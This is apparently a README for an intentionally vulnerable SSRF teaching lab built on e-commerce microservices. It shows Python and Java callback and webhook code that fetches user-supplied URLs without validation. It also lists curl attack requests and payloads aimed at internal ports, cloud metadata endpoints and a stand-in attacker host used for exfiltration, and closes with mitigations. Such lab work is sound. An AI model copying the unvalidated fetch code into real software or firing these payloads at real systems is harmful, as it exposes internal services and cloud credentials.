# 🔓 SSRF Lab - Realistic Callback Scenarios

## 📋 Overview

Lab này đã được refactor để sử dụng **callback_url** trong các scenario thực tế của e-commerce, thay vì sử dụng callback một cách gượng ép.

---

## 🎯 **2 Realistic SSRF Scenarios**

### **Scenario 1: Purchase Flow with Inventory Callback**
**Business Logic:**
```
User mua hàng → Inventory Service trừ kho → Gửi callback notification
```

**Vulnerable Endpoint:** `POST /api/inventory/purchase`

**Request Body:**
```json
{
  "product_id": 1,
  "size": "M",
  "quantity": 1,
  "callback_url": "http://payment-gateway.internal/webhook"
}
```

**Attack Flow:**
1. User chọn sản phẩm và size
2. Click "Purchase" với malicious callback_url
3. Inventory service trừ kho thành công
4. **SSRF:** Server tự động gửi GET request đến `callback_url`
5. Attacker có thể:
   - Scan internal network: `http://192.168.1.1:8080`
   - Access internal services: `http://localhost:8081/api/users`
   - Read cloud metadata: `http://169.254.169.254/latest/meta-data/`

**SSRF Code (inventory-service/app.py):**
```python
@app.route('/api/inventory/purchase', methods=['POST'])
def purchase_inventory():
    data = request.json
    product_id = data.get('product_id')
    size = data.get('size')
    quantity = data.get('quantity', 1)
    callback_url = data.get('callback_url')  # SSRF vulnerable parameter
    
    # Business logic: Reduce inventory
    inventory_item = Inventory.query.filter_by(
        product_id=product_id, 
        size=size
    ).first()
    
    if inventory_item and inventory_item.quantity >= quantity:
        inventory_item.quantity -= quantity
        db.session.commit()
        
        # SSRF VULNERABILITY: Send callback notification
        if callback_url:
            try:
                response = requests.get(callback_url, timeout=5)
                print(f"Callback sent to {callback_url} - Status: {response.status_code}")
            except Exception as e:
                print(f"Callback failed: {str(e)}")
        
        return jsonify({
            'success': True,
            'new_quantity': inventory_item.quantity
        })
```

---

### **Scenario 2: User Registration Webhook**
**Business Logic:**
```
User đăng ký → User Service tạo account → Gửi webhook notification
```

**Vulnerable Endpoint:** `POST /api/auth/register`

**Request Body:**
```json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "password123",
  "webhookUrl": "http://crm-system.internal/user-created"
}
```

**Attack Flow:**
1. User fill registration form
2. Thêm malicious `webhookUrl`
3. User service tạo account thành công
4. **SSRF:** Server tự động gửi POST request (với user data) đến `webhookUrl`
5. Attacker có thể:
   - Exfiltrate user data to external server
   - Trigger actions on internal services
   - Exploit internal APIs without authentication

**SSRF Code (user-service/.../UserService.java):**
```java
public AuthResponse register(RegisterRequest request) {
    // Create user...
    userRepository.save(user);

    // SSRF VULNERABILITY: Send webhook notification
    if (request.getWebhookUrl() != null && !request.getWebhookUrl().isEmpty()) {
        sendWebhookNotification(request.getWebhookUrl(), user);
    }
    
    return new AuthResponse(token, user.getUsername(), user.getRole());
}

private void sendWebhookNotification(String webhookUrl, User user) {
    try {
        URL url = new URL(webhookUrl);  // No URL validation!
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        
        String payload = String.format(
            "{\"event\":\"user.registered\",\"user\":{\"username\":\"%s\",\"email\":\"%s\"}}",
            user.getUsername(), user.getEmail()
        );
        
        conn.getOutputStream().write(payload.getBytes());
        int responseCode = conn.getResponseCode();
        System.out.println("Webhook sent to " + webhookUrl + " - Response: " + responseCode);
    } catch (Exception e) {
        System.err.println("Webhook failed: " + e.getMessage());
    }
}
```

---

## 🧪 **Testing SSRF Vulnerabilities**

### **Test 1: Purchase Callback Attack**
```bash
# Normal purchase request
curl -X POST http://172.20.10.2/api/inventory/purchase \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 1,
    "size": "M",
    "quantity": 1,
    "callback_url": "http://localhost:8081/api/users"
  }'

# Expected: Inventory reduced + Server sends GET to localhost:8081
```

**Frontend Demo:**
1. Navigate to product detail page
2. Click "🔓 SSRF Demo: Purchase with Callback"
3. Click "Generate Random SSRF Payload"
4. Click "Purchase (with SSRF)"
5. Check inventory-service logs for callback request

---

### **Test 2: User Registration Webhook Attack**
```bash
# Malicious registration with webhook
curl -X POST http://172.20.10.2/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "password123",
    "webhookUrl": "http://localhost:5433"
  }'

# Expected: User created + Server sends POST to localhost:5433 (PostgreSQL port)
```

**Frontend Demo:**
1. Navigate to `/register`
2. Click "🔓 SSRF Demo: Webhook Attack"
3. Click "Generate Random SSRF Payload"
4. Fill username, email, password
5. Click "Register"
6. Check user-service logs for webhook POST request

---

## 🎓 **Educational Value**

### **Why These Scenarios Are Realistic:**

1. **Purchase Callback:**
   - Real e-commerce systems thông báo đến payment gateway sau khi trừ kho
   - Warehouse systems cần sync với inventory
   - Third-party logistics cần biết stock availability

2. **User Registration Webhook:**
   - CRM systems cần biết khi có user mới
   - Email marketing platforms cần sync users
   - Analytics platforms tracking user registrations

### **SSRF Impact:**
- ✅ Internal network scanning
- ✅ Access internal services without authentication
- ✅ Cloud metadata exfiltration (AWS, Azure, GCP)
- ✅ Port scanning
- ✅ Data exfiltration via external callbacks

---

## 🛠️ **Deployment Instructions**

### **Rebuild Services:**
```bash
# Rebuild user-service (Java changes)
docker compose build user-service

# Rebuild frontend (React changes)
docker compose build frontend

# Restart inventory-service (Python changes)
docker compose restart inventory-service

# Check all services running
docker compose ps
```

### **Test Endpoints:**
```bash
# Test inventory purchase endpoint
curl http://172.20.10.2/api/inventory/purchase

# Test user registration endpoint
curl http://172.20.10.2/api/auth/register

# Access frontend
http://172.20.10.2
```

---

## 📊 **Attack Payloads Examples**

### **Internal Service Scanning:**
```
http://localhost:8081/api/users          # User service
http://localhost:8082/admin/products/    # Product admin
http://localhost:8083/api/inventory/1/M  # Inventory service
http://localhost:5433                     # PostgreSQL user DB
http://localhost:5434                     # PostgreSQL product DB
```

### **Cloud Metadata (AWS/Azure/GCP):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
```

### **External Callbacks (Data Exfiltration):**
```
http://attacker-server.com/steal?data=sensitive
http://burp-collaborator.example.com
http://webhook.site/your-unique-url
```

---

## 🔒 **Mitigation (For Learning)**

### **How to Fix SSRF:**

1. **URL Whitelist:**
```python
ALLOWED_DOMAINS = ['payment-gateway.com', 'warehouse-api.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_DOMAINS
```

2. **Block Internal IPs:**
```java
private boolean isInternalIP(String url) {
    URL parsed = new URL(url);
    InetAddress addr = InetAddress.getByName(parsed.getHost());
    return addr.isSiteLocalAddress() || addr.isLoopbackAddress();
}
```

3. **Use Dedicated Service:**
```python
# Thay vì gọi trực tiếp, gửi qua message queue
publish_event('purchase.completed', {
    'product_id': product_id,
    'callback_url': callback_url  # Validated by queue worker
})
```

---

## 📝 **Summary**

| Scenario | Endpoint | Method | SSRF Parameter | Business Context |
|----------|----------|--------|----------------|------------------|
| Purchase Callback | `/api/inventory/purchase` | POST | `callback_url` | Payment gateway notification |
| User Registration Webhook | `/api/auth/register` | POST | `webhookUrl` | CRM/Analytics integration |

**Key Improvements:**
- ✅ Callback URLs used in **realistic business flows**
- ✅ **Async operations** where callbacks make sense
- ✅ **Educational** - demonstrates real-world SSRF scenarios
- ✅ **Burp Suite compatible** - easy to intercept and modify
- ✅ **Frontend demos** - visual exploitation guides

---

**Happy Hacking! 🔓**
